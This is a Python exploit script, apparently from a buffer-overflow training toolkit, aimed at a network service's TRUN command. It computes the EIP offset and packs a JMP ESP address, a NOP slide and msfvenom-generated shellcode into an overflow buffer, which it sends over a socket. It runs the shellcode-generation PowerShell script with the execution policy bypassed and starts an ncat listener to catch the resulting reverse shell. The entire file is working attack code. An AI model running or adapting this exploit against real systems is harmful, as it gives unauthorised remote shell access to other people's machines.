import sys

import pwn
import struct
import socket
import subprocess
from .msfshellcode import shellcode


def exploit(host, port, fuzzsize, eip, jmpesp):
    def base16format(num):
        return int("0x" + num, 16)

    offset = pwn.cyclic_metasploit_find(
        base16format(eip)
    )

    jmpesp = base16format(jmpesp)

    neweip = struct.pack("<I", jmpesp)

    nopslide = b"\x90" * 10

    with open("./scripts/msfshellcode/msfvenomcmd.ps1") as file:
        newlines = file.read().replace(
            "[]", socket.gethostbyname(socket.gethostname())
        ).replace(
            "{}", "17185"
        )
    with open("./scripts/msfshellcode/msfvenomcmd.ps1", "w") as file:
        file.write(newlines)

    msfvenom = subprocess.Popen(
        [
            "powershell",
            "-ep", "Bypass", "./scripts/msfshellcode/msfvenomcmd.ps1"
        ], stdout=sys.stdout
    )
    msfvenom.communicate()
    msfvenom.wait()

    payload = shellcode.buf

    with open("./scripts/msfshellcode/msfvenomcmd.ps1") as file:
        newlines = file.read().replace(
            socket.gethostbyname(socket.gethostname()), "[]"
        ).replace(
            "17185", "{}"
        )
    with open("./scripts/msfshellcode/msfvenomcmd.ps1", "w") as file:
        file.write(newlines)

    try:
        buffer = b"".join([
            b"TRUN",
            b" ",
            b"/.:/",
            b"A" * offset,
            neweip,
            nopslide,
            payload,
            b"C" * (fuzzsize - offset - len(neweip) - len(nopslide) - len(payload))
        ])

        sock = socket.socket(
            socket.AF_INET,
            socket.SOCK_STREAM
        )
        sock.settimeout(1)

        sock.connect((host, port))

        sock.send(buffer)
        print(
            "Transmitting {} bytes: {}".format(len(buffer), buffer)
        )

        sock.recv(1024)
        sock.close()

    except socket.error:
        print("Couldn't connect to socket")


def terminal():
    subprocess.Popen(
        [
            "powershell",
            ".\\external-tools\\Ncat-Portable\\ncat.exe",
            "-lvnp", "17185"
        ], creationflags=subprocess.CREATE_NEW_CONSOLE
    )
